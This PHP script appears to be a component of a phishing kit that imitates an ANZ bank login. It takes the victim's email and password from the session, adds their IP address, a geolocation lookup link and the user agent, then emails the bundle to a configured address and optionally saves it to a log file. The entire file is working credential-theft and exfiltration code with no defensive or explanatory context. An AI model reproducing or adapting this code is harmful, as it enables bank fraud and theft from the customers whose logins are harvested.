<?php
    require 'includes/Config.php';
    require 'includes/functions.php';
    $message = "";
    $ip = $_SERVER['REMOTE_ADDR'];
    $subject = "Anz Login by $ip";
    

    $message .= "|------------- ANZ Login ----------------------|\n";
    $message .= "User              : ".$_SESSION['email']."\n";
    $message .= "Password           : ".$_SESSION['password']."\n";
    $message .= "|----------- I N F O | I P ------------|\n";
    $message .= "|Site              : ".getSite()."\n";
    $message .= "|Client IP         : ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent         : ".$useragent."\n";

    if($Send_Log==1) {
        mail($send,$subject,$message);
    }
    
    if($Save_Log==1) {
        $file=fopen("Logs/ANZ Logins.txt","w+");
        fwrite($file,$message);
        fclose($file);
    }

    
?>